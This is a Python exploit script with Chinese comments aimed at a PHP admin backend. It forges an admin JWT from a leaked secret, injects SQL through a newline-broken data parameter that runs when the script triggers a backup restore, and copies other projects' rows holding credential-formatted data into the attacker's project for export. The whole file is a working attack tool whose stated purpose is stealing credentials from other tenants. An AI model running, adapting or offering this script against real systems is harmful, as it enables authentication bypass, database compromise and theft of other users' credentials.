#!/usr/bin/env python3
# 适用：PHP 管理后台暴露 /admin/backups + /admin/data/export，且 /backend/*.php 源码泄露
# 用法：改下面 5 个常量后直接运行；会先打印 pro_id 分布，再把含凭据格式的行搬到自己的项目并导出。
import hmac, hashlib, base64, json, time, requests
requests.packages.urllib3.disable_warnings()

# ==== 配置 ====
BASE       = "https://cloud.example.com"
JWT_SECRET = b"<from /backend/config.php>"
AID        = 3            # 管理员 aid（JWT uid）
USERNAME   = "admin"
API_KEY    = "<default api key>"
MY_PRO     = 49           # 自己的项目 id
MY_UID     = 3            # contents.user_id（= aid）
LIKE_HEX   = "0x252d2d2d2d25"   # '%----%'，按目标数据格式改
# ==============

def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(uid, name, secret):
    h = b64(json.dumps({"typ": "JWT", "alg": "HS256"}).encode())
    p = b64(json.dumps({"uid": uid, "username": name, "exp": int(time.time()) + 86400}).encode())
    return h + "." + p + "." + b64(hmac.new(secret, (h + "." + p).encode(), hashlib.sha256).digest())

H = {"Authorization": "Bearer " + forge(AID, USERNAME, JWT_SECRET)}
s = requests.Session()

def _inject(sql):
    payload = "x\n;\n" + sql + ";\n--"
    r1 = s.get(BASE + "/api/insert_data",
               params={"api_key": API_KEY, "pro_id": MY_PRO, "data": payload}, timeout=30, verify=False)
    r2 = s.post(BASE + "/admin/backups", headers=H, timeout=120, verify=False)
    bid = r2.json().get("data", {}).get("id")
    if not bid:
        print("[!] backup failed:", r2.text[:150]); return None
    r3 = s.post(BASE + f"/admin/backups/{bid}/restore", headers=H, timeout=300, verify=False)
    print("[*] insert:", r1.text[:60], "| restore:", r3.text[:90])
    return r3

def leak(sql_expr, from_clause, marker_hex="0x50524f7c", limit=300):
    """带 marker 回显的 SELECT"""
    sql = ("INSERT INTO contents (pro_id,user_id,content_data,con_md5,is_delete,is_export,is_read,is_dy,add_time) "
           f"SELECT {MY_PRO},{MY_UID},CONCAT({marker_hex}, {sql_expr}, 0x7c),MD5(RAND()),0,0,0,0,NOW() {from_clause}")
    _inject(sql)
    out = []
    for page in range(1, 6):
        r = s.get(BASE + "/admin/data", headers=H,
                  params={"pro_id": MY_PRO, "page": page, "page_size": limit}, timeout=60, verify=False)
        for it in r.json().get("data", {}).get("items", []):
            cd = it.get("content_data", "") or ""
            if cd.startswith("PRO|") or "|" in cd:
                out.append(cd)
        if len(r.json().get("data", {}).get("items", [])) < limit:
            break
    for o in out[:40]:
        print("   ", o[:250])
    return out

def copy_rows(where_clause):
    """把目标行原样复制进自己项目（不加 marker，保持字段原样）"""
    sql = ("INSERT INTO contents (pro_id,user_id,content_data,con_md5,is_delete,is_export,is_read,is_dy,add_time) "
           f"SELECT {MY_PRO},{MY_UID},content_data,MD5(RAND()),0,0,0,0,NOW() "
           f"FROM contents WHERE pro_id <> {MY_PRO} AND {where_clause}")
    return _inject(sql)

def export(out="export.zip"):
    r = s.get(BASE + "/admin/data/export", headers=H, params={"pro_id": MY_PRO}, timeout=300, verify=False)
    open(out, "wb").write(r.content)
    print("[*] export:", r.status_code, len(r.content), "->", out)

if __name__ == "__main__":
    leak("pro_id, 0x7c, COUNT(*)", "FROM contents GROUP BY pro_id", "0x50524f7c")   # PRO|
    copy_rows(f"content_data LIKE {LIKE_HEX}")
    export()
